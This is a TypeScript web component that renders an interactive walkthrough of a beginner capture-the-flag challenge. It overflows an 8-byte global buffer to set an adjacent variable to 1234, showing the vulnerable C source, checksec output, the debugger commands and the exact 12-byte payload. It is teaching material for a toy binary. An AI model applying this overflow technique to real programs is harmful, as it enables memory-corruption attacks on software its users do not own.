import { StepWalkthrough } from "./StepWalkthrough"
import {
  setSolveStep,
  solveStyles,
  solveTemplate,
} from "./PwnSolveWalkthrough"

const byteCells = (values: string[], target = false, filled = true) =>
  values
    .map(
      (value) =>
        `<span class="byte" ${target ? 'data-target=""' : filled ? 'data-filled=""' : ""}>${value}</span>`,
    )
    .join("")

const styles = /* css */ `
  .challenge-layout { display: grid; gap: 12px; }
  .source { margin-bottom: 4px; }
  .map-card { padding: 12px; border: 1px solid var(--line); border-radius: 8px; background: var(--surface); }
  .map-title { display: flex; align-items: center; justify-content: space-between; gap: 10px; margin-bottom: 12px; font: 12px var(--mono); }
  .map-title strong { color: var(--accent); }
  .map-title span { color: var(--secondary); }
  .memory-rows { display: grid; gap: 8px; }
  .memory-row { display: grid; grid-template-columns: minmax(105px, .8fr) minmax(100px, .9fr) minmax(0, 2fr); align-items: center; gap: 9px; padding: 8px; border: 1px solid var(--line); border-radius: 6px; background: var(--surface); }
  .memory-row[data-buffer] { border-color: var(--accent); }
  .memory-row[data-secret] { border-color: var(--danger); background: var(--danger-fill); }
  .memory-name { font: 12px var(--mono); }
  .memory-address { color: var(--secondary); font: 11px var(--mono); }
  .memory-row .bytes { --count: 8; }
  .memory-row[data-secret] .bytes { --count: 4; }
  .memory-row[data-secret] .byte { border-color: var(--danger); color: var(--danger); }
  .memory-row .byte { min-height: 36px; }
  .hex-value { display: flex; justify-content: center; align-items: center; gap: 10px; padding: 9px; border: 1px solid var(--danger); border-radius: 6px; background: var(--danger-fill); font: 15px var(--mono); }
  .hex-value strong { color: var(--danger); }
  .mapping { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 4px; height: 34px; margin-top: 12px; }
  .mapping span { display: grid; place-items: center; border: 1px solid var(--line); border-radius: 4px; color: var(--secondary); font: 10px var(--mono); }
  .mapping span[data-write] { border-color: var(--accent); background: var(--accent-fill); color: var(--accent); }
  .payload-view { display: grid; justify-items: stretch; gap: 12px; }
  .outcome { display: grid; justify-items: center; gap: 10px; text-align: center; }
  .outcome strong { color: var(--accent); font-size: 24px; }
  .outcome .check { padding: 10px 15px; border: 1px solid var(--accent); border-radius: 7px; background: var(--accent-fill); color: var(--accent); font: 16px var(--mono); }
  :host(:is(:fullscreen, [data-expanded])) .map-title { font-size: 16px; }
  :host(:is(:fullscreen, [data-expanded])) .memory-name { font-size: 16px; }
  :host(:is(:fullscreen, [data-expanded])) .memory-address { font-size: 14px; }
  :host(:is(:fullscreen, [data-expanded])) .memory-row { padding: 11px; }
  :host(:is(:fullscreen, [data-expanded])) .memory-row .byte { min-height: 49px; font-size: 17px; }
  :host(:is(:fullscreen, [data-expanded])) .hex-value { font-size: 21px; }
  :host(:is(:fullscreen, [data-expanded])) .mapping { height: 45px; }
  :host(:is(:fullscreen, [data-expanded])) .mapping span { font-size: 14px; }
  :host(:is(:fullscreen, [data-expanded])) .outcome strong { font-size: 32px; }
  :host(:is(:fullscreen, [data-expanded])) .outcome .check { font-size: 21px; }
  @media (width < 760px) {
    .memory-row { grid-template-columns: minmax(85px, .8fr) minmax(90px, 1fr); gap: 6px; }
    .memory-row .bytes { grid-column: 1 / -1; }
  }
`

const steps = [
  {
    title: "Read the source",
    visual: `<div class="challenge-layout">
      <div class="source">
        <div class="source-line"><span class="line-no">5</span><code>char buffer[<span data-highlight>8</span>];</code></div>
        <div class="source-line"><span class="line-no">6</span><code>volatile int secret = <span data-highlight>0</span>;</code></div>
        <div class="source-line"><span class="line-no">12</span><code>read(0, buffer, <span data-risk>12</span>);</code></div>
        <div class="source-line"><span class="line-no">14</span><code>if (secret == <span data-highlight>1234</span>) {</code></div>
      </div>
      <div class="target-check"><span>Goal</span><strong>set secret to 1234</strong></div>
    </div>`,
    commands: ["list 5,15"],
    output: "5  char buffer[8];\n6  volatile int secret = 0;\n...\n12     read(0, buffer, 12);\n...\n14     if (secret == 1234) {",
    caption: "The buffer holds 8 bytes, while read() can write up to 12.",
  },
  {
    title: "Check protections",
    visual: `<div class="badges">
      <div class="badge"><b>None</b><span>stack canary</span></div>
      <div class="badge"><b>Off</b><span>PIE</span></div>
      <div class="badge"><b>On</b><span>NX</span></div>
    </div>`,
    commands: ["checksec"],
    output: "Arch: amd64\nStack: No canary found\nPIE: No PIE (0x400000)\nNX: enabled",
    caption: "The binary has no stack canary or PIE; NX is enabled.",
  },
  {
    title: "Locate the global variables",
    visual: `<div class="challenge-layout">
      <div class="map-card">
        <div class="map-title"><strong>program · writable mapping</strong><span>0x404000–0x405000 · rw-p</span></div>
        <div class="memory-rows">
          <div class="memory-row" data-buffer><span class="memory-name">buffer[8]</span><span class="memory-address">0x404048</span><div class="bytes">${byteCells(Array(8).fill("00"), false, false)}</div></div>
          <div class="memory-row" data-secret><span class="memory-name">secret · int</span><span class="memory-address">0x404050</span><div class="bytes">${byteCells(Array(4).fill("00"), false, false)}</div></div>
        </div>
        <div class="mapping"><span>r--p · file</span><span>r-xp · code</span><span data-write>rw-p · globals</span></div>
      </div>
    </div>`,
    commands: [
      "p/x &buffer",
      "p/x &secret",
    ],
    output: "$1 = (char (*)[8]) 0x404048\n$2 = (volatile int *) 0x404050",
    caption: "In this build, secret starts immediately after the 8-byte buffer.",
  },
  {
    title: "Build the 12-byte input",
    visual: `<div class="payload-view">
      <div class="map-title"><strong>program · writable memory</strong><span>input · 12 bytes</span></div>
      <div class="memory-rows">
        <div class="memory-row" data-buffer><span class="memory-name">buffer[8]</span><span class="memory-address">0x404048</span><div class="bytes">${byteCells(Array(8).fill("41"))}</div></div>
        <div class="memory-row" data-secret><span class="memory-name">secret · int</span><span class="memory-address">0x404050</span><div class="bytes">${byteCells(["D2", "04", "00", "00"], true)}</div></div>
      </div>
      <div class="hex-value"><span>1234</span><span>→</span><strong>0x000004D2</strong></div>
      <div class="layout-facts"><span>little-endian · 4 bytes</span><strong>D2 04 00 00</strong></div>
    </div>`,
    commands: ["x/12bx &buffer"],
    output: "0x404048: 0x41 0x41 0x41 0x41\n0x40404c: 0x41 0x41 0x41 0x41\n0x404050: 0xd2 0x04 0x00 0x00",
    caption: "Eight A bytes fill the buffer; the next four set secret to 1234.",
  },
  {
    title: "Verify the overwrite",
    visual: `<div class="outcome"><div class="target-check"><span>Pwndbg</span><strong>secret = 1234</strong></div><strong>Correct password!</strong><div class="check">secret == 1234</div></div>`,
    commands: ["p/x secret", "p/d secret"],
    output: "$1 = 0x4d2\n$2 = 1234\nCorrect password!",
    caption: "Pwndbg shows the overwritten secret in hexadecimal and decimal.",
  },
]

class GlobalVariableSolve extends StepWalkthrough {
  protected readonly stepCount = steps.length

  protected template() {
    return solveTemplate("B0F2 · Global Variable", this.stepCount, "Global variable solve")
  }

  protected styles() {
    return `${solveStyles}${styles}`
  }

  protected renderStep() {
    const current = steps[this.step]!
    setSolveStep(
      this.shadowRoot!,
      current.title,
      current.visual,
      current.commands,
      current.output,
      current.caption,
    )
  }
}

if (!customElements.get("global-variable-solve"))
  customElements.define("global-variable-solve", GlobalVariableSolve)
